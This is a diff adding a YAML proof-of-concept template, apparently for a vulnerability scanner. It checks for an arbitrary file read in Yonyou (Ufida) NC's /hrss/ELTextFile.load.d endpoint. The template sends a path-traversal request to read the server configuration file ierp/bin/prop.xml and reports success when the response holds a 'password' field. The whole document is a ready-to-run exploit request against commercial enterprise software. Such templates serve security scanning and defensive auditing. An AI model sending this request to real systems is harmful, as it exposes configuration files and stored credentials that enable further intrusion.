@@ -1,0 +1,20 @@
+id: poc-yaml-yongyou-hrss-eltextfileloadd-anyfile-read
+info:
+  name: 用友Ufida /hrss/ELTextFile.load.d 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  - 两高一弱
+  finger: ufida-nc
+requests:
+- method: GET
+  path: /hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml
+  expression: 'status_code == 200 &&
+
+    contains(body,"<enableHotDeploy>") &&
+
+    contains(body,"password")
+
+    '
+variables: {}
+transport: http
